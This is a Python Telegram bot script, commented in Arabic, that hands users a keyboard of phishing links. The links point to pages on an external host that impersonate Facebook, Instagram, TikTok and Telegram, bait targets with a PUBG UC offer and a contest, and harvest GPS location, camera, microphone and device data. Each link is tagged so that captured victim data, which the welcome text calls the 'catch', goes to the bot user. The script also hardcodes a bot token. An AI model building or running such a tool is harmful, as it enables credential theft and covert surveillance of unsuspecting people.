# -*- coding: utf-8 -*-
# 🔱 GENERAL BOT – PUBLIC PLATFORM v6 🔱
# نظام توزيع الروابط العالمي - 10 صفحات أساسية (صفين)

import telebot
from telebot import types
import os

# --- إعدادات الهيبة (تيرمينال) ---
RED = '\033[91m'
BOLD = '\033[1m'
RESET = '\033[0m'

# توكن البوت الموحد (المنصة)
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"

# الرابط الذي زودتني به (القاعدة المركزية)
RENDER_URL = "https://fgnral-html-5waj.onrender.com" 

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# --- قائمة الصفحات التي رفعتها (الاسم ، اسم الملف) ---
MY_PAGES = [
    ("🔵 فيسبوك", "facebook.html"), ("🟪 انستغرام", "instagram.html"),
    ("⬛ تيك توك", "tiktok.html"), ("✈️ تلغرام", "telegram.html"),
    ("🎮 ببجي UC", "pubg_cuc.html"), ("🏆 مسابقة الحلم", "dream.html"),
    ("📍 موقع GPS", "gps.html"), ("📸 فحص كاميرا", "camera.html"),
    ("📱 معلومات جهاز", "device.html"), ("🎤 فحص ميكروفون", "mic.html")
]

def get_general_keyboard(user_id):
    markup = types.InlineKeyboardMarkup()
    # تنظيم الأزرار في صفين (2 في كل صف)
    for i in range(0, len(MY_PAGES), 2):
        row = []
        # الزر الأول
        name1, file1 = MY_PAGES[i]
        url1 = f"{RENDER_URL}/{file1}?chat={user_id}"
        row.append(types.InlineKeyboardButton(text=name1, url=url1))
        
        # الزر الثاني (إذا وجد)
        if i + 1 < len(MY_PAGES):
            name2, file2 = MY_PAGES[i+1]
            url2 = f"{RENDER_URL}/{file2}?chat={user_id}"
            row.append(types.InlineKeyboardButton(text=name2, url=url2))
            
        markup.row(*row)
    return markup

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = message.chat.id
    welcome_text = (
        f"<b>🔱 أهلاً بك في منصة الجنرال العالمية 🔱</b>\n\n"
        f"الروابط أدناه مبرمجة لترسل الصيد إلى حسابك مباشرة.\n"
        f"👤 <b>آيديك المسجل:</b> <code>{uid}</code>\n"
        f"🛡️ <b>الحالة:</b> جميع الأنظمة تعمل بنجاح."
    )
    bot.send_message(uid, welcome_text, reply_markup=get_general_keyboard(uid))

# --- تشغيل المحرك ---
os.system('clear')
print(f"{RED}{BOLD}🔱 GENERAL PLATFORM IS LIVE 🔱{RESET}")
print(f"{RED}Base URL: {RENDER_URL}{RESET}")

bot.infinity_polling()
